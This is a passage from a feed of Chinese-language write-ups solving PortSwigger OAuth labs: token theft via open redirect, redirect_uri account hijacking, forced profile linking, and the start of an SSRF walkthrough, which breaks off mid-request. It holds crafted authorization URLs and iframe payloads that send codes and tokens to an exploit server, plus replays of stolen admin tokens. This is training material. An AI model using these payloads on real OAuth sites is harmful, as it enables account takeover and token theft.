&lt;p>将&lt;code>Next post&lt;/code>的uri利用于目录遍历攻击处，点击最上方&lt;code>Go to exploit server&lt;/code>，并在Body构造&lt;code>'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&amp;amp;response_type=token&amp;amp;nonce=321443983&amp;amp;scope=openid%20profile%20email'&lt;/code>
![Exploit bdoy]](/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-3.jpg)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>点击最下方的&lt;code>Store&lt;/code>、&lt;code>Deliver expolit to victim&lt;/code>后点击&lt;code>Access log&lt;/code>
&lt;img alt="Access log" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-4.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>重放步骤2请求，并将&lt;code>Authorization: Bearer&lt;/code>参数更换为Admin的&lt;code>access_token&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Bearer GS-JMi8obX1Npl_w6ZM-gkPoCxtP7cpCtTJoK59wpIM&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;administrator&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;kPXuqKXUqK5HW58clRNewxWr1q80vNdO&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Administrator&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;administrator@normal-user.net&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>回到主页，点击最上方的&lt;code>Submit solution&lt;/code>，并输入&lt;code>apikey&lt;/code>内容即可解题&lt;/p>
&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: OAuth account hijacking via redirect_uri</title><link>/portswigger-posts/oauth-lab-oauth-account-hijacking-via-redirect-uri/</link><pubDate>Wed, 18 Dec 2024 22:06:13 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-account-hijacking-via-redirect-uri/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>点击右上方&lt;code>My account&lt;/code>时，出现以下跳转Request&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=gxen32ezy00to1ap50mge&amp;amp;redirect_uri=https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0ab80053042f8581896b84f602af00b3.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback?code=qLYTUERIKmhJKEWvrGoX0YpedGklu7xwprAu1kDGrcm&amp;#34;&amp;gt;https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback?code=qLYTUERIKmhJKEWvrGoX0YpedGklu7xwprAu1kDGrcm&amp;lt;/a&amp;gt;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /oauth-callback?code=W0PvtZoskGkaeRQIhUQpW6VA1KdILePu-AKvvNbGp9S &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0ad000120492857c89e286a900a20099.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>点击最上方&lt;code>Go to exploit server&lt;/code>并构造格式为&lt;code>&amp;lt;iframe src=&amp;quot;https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;amp;redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>的body，点击&lt;code>Store&lt;/code>、&lt;code>Deliver exploit to victim&lt;/code>
&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-2.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>点击&lt;code>Access log&lt;/code>
&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-3.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>重放&lt;code>/oauth-callback?code=&lt;/code>，并将&lt;code>code&lt;/code>换成&lt;code>Access log&lt;/code>内所截获的任一&lt;code>/exploit?code=&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /oauth-callback?code=xdtSFD0NoksZKpY4ZsGwhK9HELhgQXLHd8juEW9OE5K &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0ad000120492857c89e286a900a20099.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>登录后为Admin
&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-account-hijacking-via-redirect-uri-4.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>点击右上角&lt;code>Admin panel&lt;/code>后点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/p>
&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Forced OAuth profile linking</title><link>/portswigger-posts/oauth-lab-oauth-forced-oauth-profile-linking/</link><pubDate>Tue, 17 Dec 2024 21:45:56 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-forced-oauth-profile-linking/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>Login with social media&lt;/code>登录&lt;code>peter.wiener:hotdog&lt;/code>
&lt;img alt="Login with social media" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-2.jpg">&lt;/li>
&lt;li>使用&lt;code>Login&lt;/code>登录&lt;code>wiener:peter&lt;/code>，并点击&lt;code>Attach a social profile&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=dhqow40h55y1b7wcijyyd&amp;amp;redirect_uri=https://0a1a00ed04a832b784b4afba004a0058.web-security-academy.net/oauth-linking&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a7f00d004bc32f78428ad89025a0063.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/0jV25qqAAnNBoeXmkFxdg&amp;#34;&amp;gt;/interaction/0jV25qqAAnNBoeXmkFxdg&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /interaction/0jV25qqAAnNBoeXmkFxdg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a7f00d004bc32f78428ad89025a0063.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>请注意上述请求不包含用于防范 CSRF 攻击的 state 参数&lt;/li>
&lt;li>开启Burp Proxy Intercept，并再次点击&lt;code>Attach a social profile&lt;/code>，在Burp Proxy Intercept中不断将Request Forward，直到下述Reqest出现，并将之Drop
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /oauth-linking?code=475weTD38sy3h-cNaA3iuZCJVu3WULDbyIiXULDbURe &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>关闭Burp Proxy Intercept，并回到主页后进行&lt;code>Log out&lt;/code>&lt;/li>
&lt;li>点击最上方的&lt;code>Go to exploit server&lt;/code>，Body中填入格式为&lt;code>&amp;lt;iframe src=&amp;quot;https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>的内容，填写完毕后点击&lt;code>Store&lt;/code>、&lt;code>Deliver exploit to victim&lt;/code>
&lt;img alt="Body" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-3.jpg">&lt;/li>
&lt;li>回到主页后通过&lt;code>Login with social media&lt;/code>登录，已提权为Admin
&lt;img alt="Role Admin" src="/img/2024/oauth-lab-oauth-forced-oauth-profile-linking-4.jpg">&lt;/li>
&lt;li>点击右上方&lt;code>Admin panel&lt;/code>后点击&lt;code>carlos - Delete&lt;/code> 即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF via OpenID dynamic client registration</title><link>/portswigger-posts/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration/</link><pubDate>Mon, 16 Dec 2024 22:09:47 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>在进行&lt;code>OAuth&lt;/code>认证过程中出现Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=l1kif2c33dzynw35u6gk4&amp;amp;redirect_uri=https://0a5f004403a359e4821360e0001b0098.web-security-academy.net/oauth-callback&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据&lt;code>OpenAPI doc&lt;/code>此站点包含&lt;code>/.well-known/openid-configuration&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /.well-known/openid-configuration &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;registration_endpoint&amp;#34;: &amp;#34;https://oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net/reg&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据上述返回注册接口在&lt;code>/reg&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /reg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;h1&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">oops! something went wrong&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/h1&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;pre&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;strong&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">error&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/strong&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">: invalid_redirect_uri&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/pre&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;pre&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;strong&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">error_description&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/strong&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">: redirect_uris is mandatory property&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/pre&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">&amp;lt;/div&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据错误提示，新增&lt;code>redirect_uris&lt;/code>参数后再次发送注册Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /reg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;redirect_uris&amp;#34;&lt;/span> : [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;https://example.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">201&lt;/span> &lt;span style="color:#a6e22e">Created&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;client_id&amp;#34;: &amp;#34;aMAjpQBJD2zyyZncdGkIj&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>&lt;code>client_id&lt;/code>为&lt;code>aMAjpQBJD2zyyZncdGkIj&lt;/code>，OAuth流程中，显示客户端应用程序的Logo的url为&lt;code>/client/client_id/logo&lt;/code>，对应此&lt;code>client id&lt;/code>为&lt;code>/client/aMAjpQBJD2zyyZncdGkIj/logo&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /client/aMAjpQBJD2zyyZncdGkIj/logo &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">204&lt;/span> &lt;span style="color:#a6e22e">No Content&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>再次尝试发送注册Request，但通过Burp Collaborator进行SSRF确认
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /reg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;redirect_uris&amp;#34;&lt;/span> : [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;https://example.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
